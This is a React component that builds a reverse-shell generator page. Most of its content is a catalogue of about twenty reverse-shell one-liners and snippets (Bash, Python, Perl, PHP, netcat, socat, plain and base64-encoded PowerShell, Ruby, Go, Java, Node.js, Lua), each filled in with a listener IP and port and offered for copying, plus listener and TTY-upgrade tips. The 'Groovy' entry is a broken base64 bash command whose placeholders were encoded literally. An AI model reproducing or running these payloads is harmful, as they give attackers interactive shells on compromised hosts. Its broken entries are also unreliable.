import { useState } from "react";
import { motion } from "framer-motion";
import {
  ArrowLeft,
  Copy,
  Check,
  Terminal,
  AlertTriangle,
  Settings,
  Code,
  Globe,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";

interface ShellTemplate {
  name: string;
  lang: string;
  category: string;
  generate: (ip: string, port: string) => string;
}

const shells: ShellTemplate[] = [
  {
    name: "Bash TCP",
    lang: "bash",
    category: "Linux",
    generate: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
  },
  {
    name: "Bash UDP",
    lang: "bash",
    category: "Linux",
    generate: (ip, port) => `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
  },
  {
    name: "Python3",
    lang: "python",
    category: "Cross-platform",
    generate: (ip, port) => `python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("${ip}",${port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'`,
  },
  {
    name: "Python3 One-liner",
    lang: "python",
    category: "Cross-platform",
    generate: (ip, port) => `python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('${ip}',${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"`,
  },
  {
    name: "Python3 (pty)",
    lang: "python",
    category: "Cross-platform",
    generate: (ip, port) => `python3 -c "import socket,subprocess,os,pty;s=socket.socket();s.connect(('${ip}',${port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')"`,
  },
  {
    name: "Perl",
    lang: "perl",
    category: "Cross-platform",
    generate: (ip, port) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}'`,
  },
  {
    name: "PHP",
    lang: "php",
    category: "Web",
    generate: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    name: "PHP (exec)",
    lang: "php",
    category: "Web",
    generate: (ip, port) => `php -r "exec('bash -c \"bash -i >& /dev/tcp/${ip}/${port} 0>&1\"');"`,
  },
  {
    name: "Netcat (-e)",
    lang: "nc",
    category: "Linux",
    generate: (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
  },
  {
    name: "Netcat (mkfifo)",
    lang: "nc",
    category: "Linux",
    generate: (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
  },
  {
    name: "Netcat (bash)",
    lang: "nc",
    category: "Linux",
    generate: (ip, port) => `ncat ${ip} ${port} -e /bin/bash`,
  },
  {
    name: "Socat",
    lang: "socat",
    category: "Linux",
    generate: (ip, port) => `socat TCP:${ip}:${port} EXEC:"bash -li",pty,stderr,setsid,sigint,sane`,
  },
  {
    name: "Ncat",
    lang: "ncat",
    category: "Linux",
    generate: (ip, port) => `ncat ${ip} ${port} --ssl -e /bin/bash`,
  },
  {
    name: "PowerShell",
    lang: "powershell",
    category: "Windows",
    generate: (ip, port) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
  },
  {
    name: "PowerShell (encoded)",
    lang: "powershell",
    category: "Windows",
    generate: (ip, port) => {
      const raw = `$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=$r+"PS "+(pwd).Path+"> ";$sb=[Text.Encoding]::ASCII.GetBytes($rb);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`;
      const encoded = Buffer.from(raw).toString("base64");
      return `powershell -nop -enc ${encoded}`;
    },
  },
  {
    name: "Ruby",
    lang: "ruby",
    category: "Cross-platform",
    generate: (ip, port) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  },
  {
    name: "Golang",
    lang: "go",
    category: "Cross-platform",
    generate: (ip, port) => `package main

import (
    "net"
    "os"
    "os/exec"
)

func main() {
    c, _ := net.Dial("tcp", "${ip}:${port}")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}`,
  },
  {
    name: "Java",
    lang: "java",
    category: "Cross-platform",
    generate: (ip, port) => `Runtime r = Runtime.getRuntime();
Process p = r.exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/${ip}/${port} 0>&1"});
p.waitFor();`,
  },
  {
    name: "Node.js",
    lang: "node",
    category: "Cross-platform",
    generate: (ip, port) => `require('child_process').spawn('bash',['-c','bash -i >& /dev/tcp/${ip}/${port} 0>&1']);`,
  },
  {
    name: "Lua",
    lang: "lua",
    category: "Cross-platform",
    generate: (ip, port) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('bash -i <&3 >&3 2>&3');"`,
  },
  {
    name: "Groovy",
    lang: "groovy",
    category: "JVM",
    generate: (ip, port) => `bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8ke2lwfS8ke3BvcnR9IDA+JjE=}|{base64,-d}|{bash,-i}`,
  },
];

const categories = [...new Set(shells.map((s) => s.category))];

interface ReverseShellGeneratorProps {
  onBack: () => void;
}

export function ReverseShellGenerator({ onBack }: ReverseShellGeneratorProps) {
  const [ip, setIp] = useState("127.0.0.1");
  const [port, setPort] = useState("4444");
  const [selected, setSelected] = useState(0);
  const [copied, setCopied] = useState(false);
  const [categoryFilter, setCategoryFilter] = useState<string | null>(null);

  const filtered = categoryFilter
    ? shells.filter((s) => s.category === categoryFilter)
    : shells;

  const currentShell = shells[selected];
  const command = currentShell.generate(ip, port);

  const copyCommand = () => {
    navigator.clipboard.writeText(command);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.3 }}
      className="min-h-full"
    >
      <div className="max-w-6xl mx-auto px-4 sm:px-6 py-8">
        <Button
          variant="ghost"
          size="sm"
          onClick={onBack}
          className="gap-2 mb-6 text-muted-foreground hover:text-foreground"
        >
          <ArrowLeft className="size-4" />
          Back to Dashboard
        </Button>

        <div className="flex flex-col sm:flex-row items-start gap-6 mb-8">
          <div className="flex size-16 items-center justify-center rounded-2xl shrink-0 bg-red/10">
            <Terminal className="size-8 text-red" />
          </div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-3 mb-2 flex-wrap">
              <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">
                Reverse Shell Generator
              </h1>
              <Badge variant="outline" className="text-xs border-emerald/40 text-emerald">
                Active
              </Badge>
            </div>
            <p className="text-muted-foreground text-base">
              Generate reverse shell one-liners for authorized penetration testing across
              {shells.length} languages and platforms.
            </p>
          </div>
        </div>

        {/* Config */}
        <div className="glass-card rounded-2xl p-6 mb-6">
          <div className="flex items-center gap-2 mb-4">
            <Settings className="size-4 text-muted-foreground" />
            <h3 className="text-sm font-semibold">Connection Settings</h3>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div>
              <label className="text-xs text-muted-foreground mb-1.5 block uppercase tracking-wider">
                <Globe className="size-3 inline mr-1" />
                Listener IP
              </label>
              <Input
                value={ip}
                onChange={(e) => setIp(e.target.value)}
                placeholder="127.0.0.1"
                className="font-mono"
              />
            </div>
            <div>
              <label className="text-xs text-muted-foreground mb-1.5 block uppercase tracking-wider">
                <Settings className="size-3 inline mr-1" />
                Listener Port
              </label>
              <Input
                value={port}
                onChange={(e) => setPort(e.target.value)}
                placeholder="4444"
                className="font-mono"
              />
            </div>
          </div>
          <p className="text-[11px] text-muted-foreground mt-3">
            Start your listener first:{" "}
            <code className="text-cyan bg-cyan/10 px-1.5 py-0.5 rounded font-mono">
              nc -lvnp {port}
            </code>
          </p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Left: Shell List */}
          <div className="lg:col-span-1 space-y-3">
            {/* Category filter */}
            <div className="flex flex-wrap gap-1.5">
              <button
                onClick={() => setCategoryFilter(null)}
                className={`px-2.5 py-1 rounded text-[11px] font-medium transition-all ${
                  categoryFilter === null
                    ? "bg-cyan/10 text-cyan border border-cyan/30"
                    : "bg-muted/30 text-muted-foreground border border-border/50"
                }`}
              >
                All ({shells.length})
              </button>
              {categories.map((cat) => (
                <button
                  key={cat}
                  onClick={() => setCategoryFilter(cat)}
                  className={`px-2.5 py-1 rounded text-[11px] font-medium transition-all ${
                    categoryFilter === cat
                      ? "bg-cyan/10 text-cyan border border-cyan/30"
                      : "bg-muted/30 text-muted-foreground border border-border/50"
                  }`}
                >
                  {cat}
                </button>
              ))}
            </div>

            <div className="glass-card rounded-2xl p-3 max-h-[500px] overflow-y-auto">
              {filtered.map((shell) => {
                const realIdx = shells.indexOf(shell);
                return (
                  <button
                    key={shell.name}
                    onClick={() => {
                      setSelected(realIdx);
                      setCopied(false);
                    }}
                    className={`w-full text-left px-3 py-2 rounded-lg text-sm transition-all ${
                      selected === realIdx
                        ? "bg-cyan/10 text-cyan border border-cyan/30"
                        : "text-muted-foreground hover:bg-muted/30 border border-transparent"
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <span className="font-medium text-xs">{shell.name}</span>
                      <Badge variant="outline" className="text-[9px] px-1 py-0 h-3.5">
                        {shell.lang}
                      </Badge>
                    </div>
                  </button>
                );
              })}
            </div>
          </div>

          {/* Right: Command Output */}
          <div className="lg:col-span-2">
            <div className="glass-card rounded-2xl p-6">
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center gap-2">
                  <Code className="size-4 text-cyan" />
                  <h3 className="text-sm font-semibold">
                    {currentShell.name}
                  </h3>
                  <Badge variant="outline" className="text-[10px]">
                    {currentShell.lang}
                  </Badge>
                </div>
                <Button
                  onClick={copyCommand}
                  size="sm"
                  className="gap-1.5"
                >
                  {copied ? (
                    <Check className="size-3 text-emerald" />
                  ) : (
                    <Copy className="size-3" />
                  )}
                  {copied ? "Copied" : "Copy"}
                </Button>
              </div>

              <div className="bg-[#0d1117] rounded-xl p-4 overflow-x-auto border border-border/30">
                <pre className="text-sm font-mono text-emerald whitespace-pre-wrap break-all">
                  {command}
                </pre>
              </div>

              <div className="flex items-center gap-4 mt-3 text-[11px] text-muted-foreground">
                <span>
                  Target: <span className="text-cyan font-mono">{ip}:{port}</span>
                </span>
                <span>
                  Length: <span className="text-foreground font-mono">{command.length} chars</span>
                </span>
              </div>
            </div>

            {/* Tips */}
            <div className="glass-card rounded-xl p-4 border border-amber/20 mt-4">
              <div className="flex items-start gap-3">
                <AlertTriangle className="size-4 text-amber shrink-0 mt-0.5" />
                <div className="text-xs text-muted-foreground">
                  <p className="mb-1">
                    <strong className="text-foreground">For authorized testing only.</strong> These
                    payloads are intended for use in controlled penetration testing environments.
                  </p>
                  <p>
                    Use{" "}
                    <code className="text-cyan bg-cyan/10 px-1 rounded">stty raw -echo; stty cols 120</code>{" "}
                    in your listener for a proper TTY shell with{" "}
                    <code className="text-cyan bg-cyan/10 px-1 rounded">rlwrap</code> or{" "}
                    <code className="text-cyan bg-cyan/10 px-1 rounded">socat</code>.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </motion.div>
  );
}
